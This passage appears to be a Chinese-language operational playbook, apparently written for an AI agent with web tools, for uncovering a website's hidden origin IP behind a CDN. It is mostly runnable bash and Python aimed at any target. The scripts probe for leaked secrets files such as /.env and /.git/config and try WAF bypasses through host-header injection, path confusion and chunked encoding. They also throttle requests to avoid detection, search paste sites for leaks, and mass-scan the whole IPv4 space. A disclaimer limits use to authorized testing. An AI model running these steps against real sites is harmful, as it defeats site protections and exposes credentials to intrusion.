# WebFetch: https://web.archive.org/cdx/search/cdx?url=<target>&output=json&fl=timestamp,original,statuscode,mimetype&collapse=digest&limit=50

# 2. 分析历史快照中的资源引用
#    早期快照可能包含源站IP的直接引用(JS/CSS/图片URL)
#    重点关注CDN接入前的状态
# WebFetch: https://web.archive.org/web/20240101000000*/<target>

# 3. 历史快照响应头 (部分存储在CDX中, 可能包含源站IP)
# WebFetch: https://web.archive.org/cdx/search/cdx?url=<target>&output=json&fl=timestamp,original,statuscode,digest&filter=statuscode:200&limit=20

# 4. 历史DNS与Wayback交叉: 找到CDN接入前的时间点 → 获取该时间点的A记录
```

### 14D.2 源码与配置文件深度审计

```bash
# 1. 常见泄露路径逐一探测
for path in \
  "/.env" "/.env.bak" "/.env.production" "/.env.local" \
  "/wp-config.php.bak" "/wp-config.php~" "/wp-config.php.old" \
  "/config.php.bak" "/configuration.php.old" \
  "/phpinfo.php" "/info.php" "/test.php" "/i.php" \
  "/.git/config" "/.svn/entries" "/.DS_Store" \
  "/server-status" "/server-info" \
  "/.well-known/security.txt" \
  "/crossdomain.xml" "/clientaccesspolicy.xml" \
  "/sitemap.xml" "/robots.txt" \
  "/readme.html" "/README.md" \
  "/debug" "/trace" "/actuator/env" "/actuator/health" \
  "/.htaccess" "/web.config" \
  "/api/config" "/api/v1/config" "/api/debug" \
  "/graphql" "/.graphql" \
  "/swagger.json" "/swagger-ui.html" "/api-docs" \
  "/elmah.axd" "/error_log" "/errors.log"; do
  code=$(curl -sI -m 3 -o /dev/null -w "%{http_code}" "https://<target>$path")
  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$path → HTTP $code"
done

# 2. JS文件中的IP/内网地址/API endpoint
curl -s "https://<target>" | grep -oP 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | while read js; do
  [ "${js:0:2}" = "//" ] && js="https:$js"
  [ "${js:0:1}" = "/" ] && js="https://<target>$js"
  curl -s "$js" | grep -oP '(?:https?://|//)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[:/]?' | sort -u
  curl -s "$js" | grep -oP '(?:https?://|//)((?:api|backend|server|origin|internal|staging|dev|admin|gateway)\.[a-z0-9.-]+)' | sort -u
done

# 3. HTML注释中的IP/内网域名
curl -s "https://<target>" | grep -oP '<!--[\s\S]*?-->' | grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'

# 4. WebSocket连接地址
curl -s "https://<target>" | grep -oP 'wss?://[^"'"'"'\s<>]+' | sort -u
```

### 14D.3 被动情报与第三方数据源

```bash
# 1. DNSDumpster — 被动DNS聚合
# WebSearch: site:dnsdumpster.com "<root_domain>"

# 2. ThreatCrowd — 威胁情报关联
# WebFetch: https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=<root_domain>

# 3. AlienVault OTX — 开源威胁情报
# WebFetch: https://otx.alienvault.com/api/v1/indicators/domain/<root_domain>/passive_dns

# 4. RiskIQ/PassiveTotal (Community版)
# WebSearch: "<root_domain>" site:community.riskiq.com

# 5. URLScan.io — 最近扫描记录中可能包含源站连接
# WebFetch: https://urlscan.io/api/v1/search/?q=domain:<root_domain>&size=10

# 6. Netcraft — 站点技术栈和历史
# WebSearch: site:netcraft.com "<root_domain>"

# 7. BuiltWith — 技术栈指纹
# WebSearch: site:builtwith.com "<root_domain>"
```

### 14D.4 云厂商元数据与内部域名探测

```bash
# 很多源站在云上部署时有内部域名(无CDN保护)
for prefix in \
  "<root_domain_no_tld>" "<root_domain_no_tld>-prod" "<root_domain_no_tld>-api" \
  "<root_domain_no_tld>-backend" "<root_domain_no_tld>-origin" "<root_domain_no_tld>-server"; do
  for suffix in \
    ".vm.elb.amazonaws.com" ".elasticbeanstalk.com" \
    ".azurewebsites.net" ".cloudapp.azure.com" \
    ".appspot.com" ".run.app" \
    ".herokuapp.com" \
    ".myqcloud.com" ".ap-guangzhou.myqcloud.com" ".ap-shanghai.myqcloud.com" \
    ".aliyuncs.com" ".ecs.aliyuncs.com" \
    ".huaweicloud.com" ".cce.huaweicloud.com"; do
    ip=$(nslookup "${prefix}${suffix}" 2>/dev/null | grep -A1 "Name:" | grep "Address" | awk '{print $2}')
    [ -n "$ip" ] && echo "FOUND: ${prefix}${suffix} → $ip"
  done
done

# 云厂商IP段筛选:
#   AWS:   https://ip-ranges.amazonaws.com/ip-ranges.json (筛选service=EC2)
#   Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
#   GCP:   nslookup -type=TXT _cloud-netblocks.googleusercontent.com
#   阿里云: 47.x.x.x, 39.x.x.x, 120.x.x.x, 121.x.x.x
#   腾讯云: 101.32-35.x.x, 43.x.x.x, 49.x.x.x, 118.x.x.x
#   华为云: 117.50.x.x, 119.3.x.x, 121.37.x.x, 139.159.x.x
```

### 14D.5 WAF/防护层穿透

```bash
# 1. HTTP方法绕过 (某些WAF只拦截GET/POST)
for method in OPTIONS HEAD TRACE PUT DELETE PATCH CONNECT; do
  curl -s -X $method -m 3 -o /dev/null -w "$method → %{http_code} %{size_download}B\n" "https://<target>"
done

# 2. 路径混淆
curl -sI "https://<target>/..;/"
curl -sI "https://<target>/%2e%2e/"
curl -sI "https://<target>/.%00/"

# 3. Host头注入测试 (异常Host头可能返回源站IP)
curl -sI -H "Host: localhost" "https://<cdn_node_ip>" -k
curl -sI -H "Host: 127.0.0.1" "https://<cdn_node_ip>" -k
curl -sI -H "Host: " "https://<cdn_node_ip>" -k

# 4. X-Forwarded-For/X-Real-IP欺骗 (后端可能回显真实IP)
curl -sI -H "X-Forwarded-For: 127.0.0.1" "https://<target>"
curl -sI -H "X-Real-IP: 127.0.0.1" "https://<target>"

# 5. 大请求体绕过 (CDN/WAF对超大请求体可能不检测直接转发)
python3 -c "print('A'*1000000)" | curl -s -X POST -d @- "https://<target>" -o /dev/null -w "%{http_code} %{size_download}B"

# 6. 分块传输编码绕过
curl -s -H "Transfer-Encoding: chunked" -X POST -d "0\r\n\r\n" "https://<target>"

# 7. Content-Type混淆
curl -sI -H "Content-Type: application/json" "https://<target>"
curl -sI -H "Content-Type: multipart/form-data" "https://<target>"
```

### 14D.6 时间维度攻击

```bash
# 1. SSL证书续期监控 (Let's Encrypt 90天续期, ACME验证可能绕过CDN)
curl -sI "https://<target>/.well-known/acme-challenge/test"
# 如果返回源站特征而非CDN特征 → 存在绕过窗口

# 2. CDN配置不一致时间窗
#    某些目标在更新CDN配置时会短暂暴露源站
#    通过反复DNS查询(不同时间段)捕捉配置变更瞬间
# */5 * * * * dig +short <target> >> /tmp/dns_monitor.log

# 3. 新增子域名监控 (新上线的子域名可能还未接入CDN)
# WebFetch: https://crt.sh/?q=%25.<root_domain>&output=json
# 筛选最近7天签发的证书中出现的新子域名 → 逐一nslookup检查

# 4. CDN缓存过期窗口
#    缓存过期后回源请求可能暴露源站IP
#    监控X-Cache: MISS时的响应头

# 5. 证书透明度时间窗口
#    新证书签发时, CA验证过程可能短暂暴露源站
```

### 14D.7 社工辅助情报（被动收集）

```bash
# 1. GitHub/GitLab 代码搜索 (可能包含源站IP、配置文件)
# WebSearch: site:github.com "<root_domain>" ip OR host OR server OR origin OR backend
# WebSearch: site:github.com "<root_domain>" ".env" OR "config" OR "database_host"

# 2. Pastebin/代码分享平台
# WebSearch: site:pastebin.com "<root_domain>"
# WebSearch: site:paste.ee "<root_domain>"

# 3. 搜索引擎缓存
# WebSearch: "<root_domain>" intext:"server" intext:"nginx" OR intext:"apache" -site:<root_domain>
# WebSearch: "<root_domain>" "real ip" OR "origin ip" OR "源站" OR "真实IP"

# 4. 社交媒体/论坛泄露
# WebSearch: "<root_domain>" ip address site:reddit.com OR site:stackoverflow.com OR site:v2ex.com OR site:52pojie.cn

# 5. 安全报告/漏洞披露
# WebSearch: "<root_domain>" "HackerOne" OR "bugcrowd" OR "vulnerability" OR "漏洞"

# 6. WHOIS历史记录关联
# WebSearch: "<registrant_email>" 域名注册
# WebSearch: "<registrant_org>" 域名 备案
# 找到同一注册人的其他域名 → 查A记录 → 可能共用源站

# 7. Google Analytics/AdSense ID关联
curl -s "https://<target>" | grep -oE 'UA-[0-9]+-[0-9]+|G-[A-Z0-9]+|ca-pub-[0-9]+'
# 用提取到的ID搜索: WebSearch: "UA-XXXXXX" site → 找到使用同一统计ID的网站
```

### 14D.8 网络拓扑推断

```bash
# 1. Traceroute分析 (CDN回源路径在traceroute中可见)
traceroute <target> 2>/dev/null || tracert <target> 2>/dev/null

# 2. MTR分析 (更详细的路径信息)
mtr --report --report-cycles 5 <target> 2>/dev/null

# 3. TCP指纹比对 (不同OS的TCP实现有不同特征)
#    TTL初始值: Linux=64, Windows=128, Cisco=255
#    TCP Window Size, TCP Options顺序和值
#    CDN节点通常是Linux, 如果源站是Windows可通过TTL区分
curl -sI -m 3 "https://<target>" -w "\nTTL: local_ip=%{local_ip} remote_ip=%{remote_ip}\n"

# 4. ICMP Ping对比 (CDN节点和源站的TTL/响应时间可能有明显差异)
ping -c 3 <target> 2>/dev/null || ping -n 3 <target> 2>/dev/null

# 5. BGP路由分析
#    查看CDN节点的BGP路由, 回源路径可能暴露源站ASN
# WebFetch: https://bgp.he.net/AS<ASN>#_prefixes
```

### 14D.9 国际出口/地域差异利用

```bash
# 1. 某些CDN只覆盖特定地区, 不同地区DNS/代理可能获得不同结果
#    在线多地点DNS查询:
# WebFetch: https://check-host.net/check-dns?host=<target>
# WebFetch: https://www.whatsmydns.net/api/details?server=dns&q=<target>&type=A

# 2. IPv4 vs IPv6差异 (某些CDN仅覆盖IPv4, IPv6直连源站)
nslookup -type=AAAA <target>
# 如果有AAAA记录, curl -6 直连测试

# 3. 境外DNS解析可能跳过国内CDN
nslookup <target> 8.8.8.8
nslookup <target> 1.1.1.1
nslookup <target> 208.67.222.222
# 对比国内DNS (114.114.114.114) 结果是否不同

# 4. EDNS Client Subnet地域欺骗
dig +subnet=1.2.3.4/32 <target> @8.8.8.8    # 伪装亚洲IP
dig +subnet=8.8.8.8/32 <target> @8.8.8.8    # 伪装美国IP
# 不同地域可能返回不同CDN节点或源站IP
```
---
## §14E. 证据链S/A/B/C/X分级与贝叶斯融合 (v1.3 新增)

> **融合 FUCK-CDN 的证据分级体系**与大爱仙尊的贝叶斯置信度评分，实现定性+定量双重判定。

### 14E.1 证据强度定义

| 等级 | 名称 | 典型证据 | 贝叶斯LLR映射 | 验证权重 |
|------|------|---------|-------------|---------|
| **S** | 决定性 | SSL证书序列号匹配+默认证书不同+Server头差异 | P≥0.95 直接确认 | 35%+25%+20% |
| **A** | 强佐证 | 历史DNS直接确认/IP反查绑定/空间引擎命中 | LLR +2.0~+3.0 | 20% |
| **B** | 佐证 | SPF包含/子域名解析/同C段关联/GA ID关联 | LLR +1.0~+1.8 | 10% |
| **C** | 弱线索 | 搜索引擎提及/同组织域名/JS端点/社工情报 | LLR +0.3~+0.8 | 5% |
| **X** | 已排除 | 确认CDN节点/无关服务器/已下线 | LLR -1.0~-1.5 | 排除 |

### 14E.2 置信度评级矩阵

| 置信度 | 条件 | 贝叶斯P值 | 行动 |
|--------|------|----------|------|
| **确定** | ≥1个S级证据 + ≥1个A级证据 | P≥0.95 | 直接确认源站 |
| **高度可信** | ≥2个A级证据互相印证 | 0.80≤P<0.95 | 补TLS/哈希指纹确认 |
| **可能** | 1个A级 + ≥1个B级 | 0.50≤P<0.80 | 需Shodan/FOFA补证 |
| **猜测** | 仅有B/C级线索 | P<0.50 | 排除或继续P4挖掘 |

### 14E.3 最终报告格式

```
╔══════════════════════════════════════════════════════════╗
║  CDN 真实 IP 溯源报告 (大爱仙尊九阶段 v1.3)                ║
║  目标: <target_domain>                                   ║
║  时间: <date>                                            ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  CDN 类型: <cdn_name> (ASN: <asn>)                       ║
║  DNS 托管: <dns_provider>                                ║
║  SSL 证书: <cert_cn> (Serial: <serial>)                  ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║  溯源结论                                                ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  真实 IP:  <final_ip>                                    ║
║  置信度:  <confidence> (P=<percentage>%)                  ║
║  归属地:  <location>                                     ║
║  运营商:  <isp>                                          ║
║  服务器:  <server_software>                              ║
║  JA3指纹: <ja3_hash>                                     ║
║  HTTP/2:  <h2_fingerprint>                               ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║  证据链                                                  ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  [S] SSL证书序列号匹配 + 默认证书不同                    ║
║  [A] 历史DNS: 2024-03-15 → 203.0.113.5                   ║
║  [A] FOFA: cert="target.com" → 203.0.113.5:443           ║
║  [B] SPF: v=spf1 ip4:203.0.113.5 ~all                   ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║  已排除 IP                                               ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  [X] 104.16.1.1 — Cloudflare CDN节点 (AS13335)          ║
║  [X] 192.0.2.7 — 无关服务器 (证书不匹配)                 ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║  执行方法 (<N>种)                                        ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  P0: SPF/MX/TXT → [B] ip4:203.0.113.5                   ║
║  P0: 历史DNS → [A] 2024-03-15: 203.0.113.5              ║
║  P1: SSL证书 → [S] 序列号匹配                            ║
║  P2: FOFA证书搜索 → [A] 203.0.113.5:443                  ║
║  §14B: Cloudflare专项 → 非代理端口无响应                 ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

### 14E.4 未能确定时的报告与建议

```
溯源结论: 未能确定真实 IP
已执行方法: <N>种 (P0: X种, P1: X种, P2: X种, P3: X种, P4: X种)
最佳候选: <ip> (置信度 <X>%, 因 <reason> 无法最终确认)

建议后续操作:
  1. 尝试邮件触发法(注册/找回密码)获取邮件头中的Received IP
  2. 申请Shodan/FOFA/Censys账号后补充空间引擎扫描
  3. 等待SSL证书续期(Let's Encrypt每90天), 续期时DNS验证可能暴露源站
  4. 持续监控域名DNS变更: python cdn_origin_monitor.py <target> --interval 3600
  5. CDN切换/故障时可能回退到源站A记录 → 设置DNS监控告警
  6. 社工辅助: GitHub代码搜索/Pastebin/安全报告中的泄露
  7. 时间窗口攻击: 监控ACME验证/CDN配置变更/新子域名上线
```
---
## §14F. 跨平台适配 + API Key注入 + Token优化 (v1.3 新增)

> **融合 FUCK-CDN 的工程化能力**，实现跨平台运行、API Key安全注入、Token最优消耗。

### 14F.1 跨平台适配规则

```bash
# 开始执行前检测平台:
if platform == win32:
    shell = PowerShell
    nslookup 可用, dig 通常不可用
    openssl/curl 通过 Git Bash (Bash工具) 执行
    python 命令用 python 而非 python3
    临时文件路径用 $env:TEMP 而非 /tmp
else:
    shell = Bash
    dig/host/whois 可用
    openssl/curl 直接使用
    python 命令用 python3
    临时文件路径用 /tmp

# 原则:
# - nslookup 跨平台可用, 优先使用
# - curl/openssl 统一走 Bash 工具 (Windows上Git Bash自带)
# - dig/host/whois 仅Linux/macOS可用, Windows上用nslookup或WebFetch替代
# - Python脚本中Windows用python, Linux用python3
```

### 14F.2 API Key 注入系统

```python
# API Key配置 (用户按需填入, 留空则跳过对应模块, 不报错)
API_KEYS = {
    'SHODAN_API_KEY':     '',  # Shodan 空间搜索引擎
    'FOFA_EMAIL':         '',  # FOFA 邮箱
    'FOFA_API_KEY':       '',  # FOFA API Key
    'CENSYS_API_ID':      '',  # Censys API ID
    'CENSYS_API_SECRET':  '',  # Censys API Secret
    'SECURITYTRAILS_KEY': '',  # SecurityTrails 历史DNS
    'ZOOMEYE_API_KEY':    '',  # ZoomEye 空间搜索引擎
    'QUAKE_API_KEY':      '',  # 360 Quake 空间搜索引擎
    'HUNTER_API_KEY':     '',  # 鹰图 Hunter 空间搜索引擎
    'VIRUSTOTAL_KEY':     '',  # VirusTotal 被动DNS
}

# 安全原则:
# - 用户在对话中提供Key时, 仅在内存中使用
# - 绝不写入文件、输出到屏幕、提交到git
# - Key越多精度越高, 留空则跳过对应模块不报错
# - 无Key时使用WebSearch/WebFetch替代方案
```

### 14F.3 无API Key时的替代方案

```bash
# 无Shodan Key:
# WebSearch: site:shodan.io "<root_domain>"
# WebFetch: https://www.shodan.io/search?query=ssl.cert.subject.CN%3A<root_domain>

# 无FOFA Key:
# WebSearch: fofa.info "<root_domain>" cert

# 无Censys Key:
# WebSearch: site:search.censys.io "<root_domain>"

# 无SecurityTrails Key:
# WebFetch: https://ipchaxun.com/<target>/  (免费历史DNS)
# WebFetch: https://site.ip138.com/<root_domain>/

# 无VirusTotal Key:
# WebFetch: https://www.virustotal.com/gui/domain/<root_domain>/relations
```

### 14F.4 Token优化执行策略

```
1. Token节省: P0全部并行 → 有候选即验证 → 无候选再逐级升级
   - P0命中率最高且Token极低 → 先跑P0
   - 早停: P0/P1有2+独立来源交叉确认 → 直接验证, 不跑P2/P3
   - 晚停: P2仍无候选才执行P3全部方法

2. 并行执行: 同优先级内的独立步骤并行调用工具
   - P0的6种方法全部并行
   - P1的7种方法全部并行
   - P2的8种方法(有API Key的部分)并行

3. 容错: 某平台/工具不可用时跳过, 不阻塞流程
   - dig不可用 → 用nslookup替代
   - API Key缺失 → 用WebSearch/WebFetch替代
   - 某个空间引擎超时 → 跳过, 用其他引擎

4. 频率控制: 避免短时间大量请求同一目标触发WAF
   - 请求间隔 ≥ 1秒
   - 并发数 ≤ 5
   - 空间引擎API: 每分钟 ≤ 30次

5. Key安全: API Key仅在内存中使用, 不写入任何文件

6. 合法合规: 仅用于授权安全测试、教学、CTF竞赛

7. 记录一切: 每个步骤的结果必须记录, 包括"无结果"
   - 便于复盘和证据链构建
   - 便于后续补充验证
```

### 14F.5 空间搜索引擎API Cookbook (8引擎 · v1.3整合)

```bash
# === Shodan ===
# 按证书CN搜索
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=ssl.cert.subject.CN:%22<root_domain>%22"
# 按HTTP标题搜索
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=http.title:%22<page_title>%22"
# 按favicon hash搜索
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=http.favicon.hash:<favicon_murmur3>"
# 验证候选IP详情
curl -s "https://api.shodan.io/shodan/host/<candidate_ip>?key=${SHODAN_API_KEY}"

# === FOFA ===
# 按证书搜索 (排除CDN)
Q=$(echo -n 'cert="<root_domain>" && header!="cf-ray" && header!="x-amz-cf"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"
# 按favicon mmh3 hash搜索
Q=$(echo -n 'icon_hash="<mmh3_hash>"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"
# 按body关键字搜索
Q=$(echo -n 'body="<unique_keyword>"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"

# === Censys ===
# 按证书CN搜索
curl -s -u "${CENSYS_API_ID}:${CENSYS_API_SECRET}" \
  "https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.subject.common_name%3A<root_domain>&per_page=50"
# 按证书SHA256搜索
curl -s -u "${CENSYS_API_ID}:${CENSYS_API_SECRET}" \
  "https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.fingerprint%3A<cert_sha256>&per_page=50"

# === ZoomEye ===
curl -s -H "API-KEY: ${ZOOMEYE_API_KEY}" \
  "https://api.zoomeye.org/host/search?query=ssl.cert.subject.cn%3A<root_domain>&page=1"

# === 360 Quake ===
curl -s -X POST "https://quake.360.net/api/v3/search/quake_service" \
  -H "X-QuakeToken: ${QUAKE_API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"query":"cert:\"<root_domain>\"","start":0,"size":50}'

# === 鹰图 Hunter ===
Q=$(echo -n 'cert.subject.cn="<root_domain>"' | base64)
curl -s "https://hunter.qianxin.com/openApi/search?api-key=${HUNTER_API_KEY}&search=${Q}&page=1&page_size=100"

# === SecurityTrails ===
curl -s "https://api.securitytrails.com/v1/history/<root_domain>/dns/a" \
  -H "APIKEY: ${SECURITYTRAILS_KEY}"

# === VirusTotal ===
curl -s "https://www.virustotal.com/api/v3/domains/<root_domain>/resolutions" \
  -H "x-apikey: ${VIRUSTOTAL_KEY}"
```

### 14F.6 Favicon Hash 计算 (跨平台)

```bash
# 下载favicon
curl -sL -m 10 -o /tmp/fav.ico "https://<target>/favicon.ico" \
  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# 计算hash (跨平台Python)
python -c "
import hashlib,base64,struct,sys
try:
    with open('/tmp/fav.ico','rb') as f: data=f.read()
    if len(data)<100: print('WARN: too small, likely error page'); sys.exit(1)
    b64=base64.encodebytes(data)
    try:
        import mmh3
        print(f'FOFA: icon_hash=\"{mmh3.hash(b64)}\"')
    except ImportError:
        print('mmh3 not installed, try: pip install mmh3')
    print(f'MD5: {hashlib.md5(data).hexdigest()}')
    print(f'SHA256: {hashlib.sha256(data).hexdigest()}')
except Exception as e: print(f'Error: {e}')
"
```

### 14F.7 多端口扫描验证

```bash
CANDIDATE="<candidate_ip>"
for port in 80 81 443 2052 2053 2082 2083 2086 2087 2095 2096 \
            3000 4443 5000 8000 8001 8008 8080 8081 8443 8880 8888 9000 9090 9443; do
  r=$(curl -sI -m 2 -k https://$CANDIDATE:$port 2>&1 | head -1)
  [ -n "$r" ] && ! echo "$r"|grep -q "curl:" && echo "HTTPS:$port $r"
  r=$(curl -sI -m 2 http://$CANDIDATE:$port 2>&1 | head -1)
  [ -n "$r" ] && ! echo "$r"|grep -q "curl:" && echo "HTTP:$port  $r"
done
```

### 14F.8 IP反查确认

```bash
# 对每个候选IP进行反查
# WebFetch: https://ipchaxun.com/<candidate_ip>/
#   → 提取该IP的归属地、运营商、以及绑定过的所有域名列表
# WebFetch: https://site.ip138.com/<candidate_ip>/
#   → 提取该IP绑定过的所有域名及时间

# /24邻居扫描 (同C段关联域名)
Q=$(echo -n 'ip="<candidate_ip>/24"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"
```
---
## §14G. 全网IP扫描溯源 (v1.4 新增 · 大规模扫描引擎)

> **全网IP扫描是CDN溯源的核武器级手段**。当P0-P4所有方法均失败时，通过主动扫描全球IPv4地址空间，用证书指纹/HTTP响应/页面哈希等特征从数十亿IP中定位源站。融合 ZMap + Masscan + ZGrab2 三大扫描引擎，覆盖全端口+全协议+全证书匹配。

### 14G.1 核心原理

```
┌──────────────────────────────────────────────────────────────────┐
│                    全网IP扫描溯源架构                              │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  输入: 目标特征指纹                                                │
│    ├─ SSL证书SHA256指纹 / 序列号 / Subject CN                     │
│    ├─ HTTP响应特征 (Server头/Title/Body Hash/Favicon Hash)        │
│    ├─ 页面唯一关键字 / 版权声明 / 特殊路径                         │
│    └─ 目标所属IP段范围 (ASN/云厂商/地区)                          │
│                                                                  │
│  扫描引擎:                                                        │
│    ├─ ZMap:     全IPv4单端口扫描 (45分钟/全0.0.0.0/0)            │
│    ├─ Masscan:  全IPv4多端口扫描 (6分钟/全0.0.0.0/0)             │
│    └─ ZGrab2:   应用层Banner抓取 (TLS/HTTP/SSH/FTP等)            │
│                                                                  │
│  匹配策略:                                                        │
│    ├─ 证书指纹精确匹配 (SHA256/Serial/SPKI) → 决定性证据          │
│    ├─ HTTP响应模糊匹配 (Title/Body/Server/Header) → 强佐证        │
│    ├─ 页面哈希一致性 (全文SHA256/SimHash) → 强佐证                │
│    └─ 行为特征关联 (响应时间/TTL/端口开放模式) → 佐证             │
│                                                                  │
│  输出: 候选源站IP列表 + 置信度排名                                │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 14G.2 ZMap 全端口证书扫描 (推荐首选)

ZMap 可以在45分钟内扫描整个IPv4地址空间（约37亿个IP）的单个端口，是全网证书溯源的核心工具。

```bash
# === 安装 ZMap + ZGrab2 ===
# Ubuntu/Debian
apt-get install zmap zgrab2
# 或从源码编译
git clone https://github.com/zmap/zmap.git && cd zmap && cmake . && make -j4
git clone https://github.com/zmap/zgrab2.git && cd zgrab2 && make

# === 方法1: 按证书SHA256指纹全网扫描 (最精确) ===
# 步骤1: 从CDN节点获取目标证书SHA256指纹
TARGET_SHA256=$(echo | openssl s_client -connect <target>:443 -servername <target> 2>/dev/null | \
  openssl x509 -outform DER 2>/dev/null | openssl dgst -sha256 | awk '{print $2}')
echo "目标证书SHA256: $TARGET_SHA256"

# 步骤2: 使用ZMap扫描全网443端口 → 输出存活IP列表
zmap -p 443 -o alive_443.txt --bandwidth=100M

# 步骤3: 使用ZGrab2抓取TLS证书 → 与目标SHA256匹配
zgrab2 tls --input-file=alive_443.txt \
  --output-file=zgrab2_output.json \
  --port=443 --timeout=10 --senders=1000

# 步骤4: 解析结果, 匹配证书SHA256
python3 -c "
import json
with open('zgrab2_output.json') as f:
    for line in f:
        try:
            r = json.loads(line)
            ip = r.get('ip', '')
            tls = r.get('data', {}).get('tls', {})
            cert = tls.get('result', {}).get('handshake_log', {}).get('server_certificates', {}).get('certificate', {}).get('parsed', {})
            sha256 = cert.get('fingerprint_sha256', '')
            if sha256 == '$TARGET_SHA256':
                cn = cert.get('subject', {}).get('common_name', '')
                print(f'[FOUND] {ip}:443 → SHA256匹配 → CN: {cn}')
        except: pass
" > candidate_ips.txt

echo "找到候选IP:" && cat candidate_ips.txt
```

```bash
# === 方法2: 按证书序列号全网扫描 (CDN可能共享同一证书) ===
TARGET_SERIAL=$(echo | openssl s_client -connect <target>:443 -servername <target> 2>/dev/null | \
  openssl x509 -noout -serial 2>/dev/null | cut -d= -f2)

zgrab2 tls --input-file=alive_443.txt --output-file=zgrab2_output.json --port=443

python3 -c "
import json
with open('zgrab2_output.json') as f:
    for line in f:
        try:
            r = json.loads(line)
            tls = r.get('data', {}).get('tls', {})
            cert = tls.get('result', {}).get('handshake_log', {}).get('server_certificates', {}).get('certificate', {}).get('parsed', {})
            serial = cert.get('serial_number', '')
            if serial == '$TARGET_SERIAL':
                ip = r.get('ip', '')
                cn = cert.get('subject', {}).get('common_name', '')
                print(f'[FOUND] {ip}:443 → Serial匹配 → CN: {cn}')
        except: pass
" > candidate_serial_ips.txt
```

```bash
# === 方法3: 按证书Subject CN全网扫描 (匹配同一域名的所有证书) ===
zgrab2 tls --input-file=alive_443.txt --output-file=zgrab2_output.json --port=443

python3 -c "
import json
target='<root_domain>'
with open('zgrab2_output.json') as f:
    for line in f:
        try:
            r = json.loads(line)
            tls = r.get('data', {}).get('tls', {})
            cert = tls.get('result', {}).get('handshake_log', {}).get('server_certificates', {}).get('certificate', {}).get('parsed', {})
            cn = cert.get('subject', {}).get('common_name', '')
            san = cert.get('extensions', {}).get('subject_alt_name', '')
            if target in cn.lower() or target in san.lower():
                ip = r.get('ip', '')
                print(f'[FOUND] {ip}:443 → CN/SAN: {cn}')
        except: pass
" > candidate_cn_ips.txt
```

### 14G.3 Masscan 多端口全协议扫描

Masscan 可在6分钟内完成全IPv4单端口扫描，是最快的互联网扫描器。支持多端口+全协议。

```bash
# === 安装 Masscan ===
apt-get install masscan
# 或编译
git clone https://github.com/robertdavidgraham/masscan.git && cd masscan && make -j4

# === 方法1: 全端口快速发现 (1000常见端口) ===
# 扫描目标所属网段 (如已知云厂商IP段)
masscan <target_ip_range>/16 -p1-65535 --rate=10000 -oJ masscan_output.json

# === 方法2: 全网扫描特定端口 (找出所有开放443的IP) ===
masscan 0.0.0.0/0 -p443 --rate=100000 --exclude 255.255.255.255 \
  -oJ all_443_hosts.json
# 注意: 全网扫描需要极高带宽, 建议在云端服务器执行

# === 方法3: 按ASN限定范围扫描 (精准缩小) ===
# 获取目标可能使用的云厂商ASN
# 阿里云: AS37963, 腾讯云: AS45090/AS132203, 华为云: AS55990
# AWS: AS16509, Azure: AS8075, GCP: AS15169

# 先获取ASN对应的IP段
whois -h whois.radb.net -- '-i origin AS37963' | grep route

# 仅扫描该ASN的IP段 (大幅缩小范围)
masscan $(whois -h whois.radb.net -- '-i origin AS37963' | grep 'route:' | awk '{print $2}' | paste -sd, -) \
  -p80,443,8080,8443,2052,2053,2083,2087,2096,8880,9443 \
  --rate=50000 -oJ masscan_asn.json

# === 方法4: 扫描CDN回源IP段 (已知CDN的回源IP段) ===
# 各CDN厂商的回源IP段通常有公开文档
# Cloudflare回源: https://www.cloudflare.com/ips/
# 阿里云CDN回源: 查阿里云控制台
# 腾讯云CDN回源: 查腾讯云控制台
# 扫描这些回源段, 找到开放目标证书的IP

# 下载Cloudflare所有IP段
curl -s https://www.cloudflare.com/ips-v4 > cf_ips.txt
# 扫描Cloudflare IP段 (这些IP的443端口可能直接暴露源站)
masscan -iL cf_ips.txt -p443 --rate=10000 -oJ cf_443_scan.json
```

### 14G.4 HTTP响应指纹全网扫描

当目标不使用HTTPS或证书特征不明显时，使用HTTP响应特征进行全网扫描。

```bash
# === 步骤1: 提取目标HTTP指纹特征 ===
# 获取页面标题
TITLE=$(curl -s https://<target> -A "Mozilla/5.0" | grep -oP '<title>\K[^<]+')
# 获取Server头
SERVER=$(curl -sI https://<target> -A "Mozilla/5.0" | grep -i "^Server:" | tr -d '\r')
# 获取Body Hash (排除动态内容)
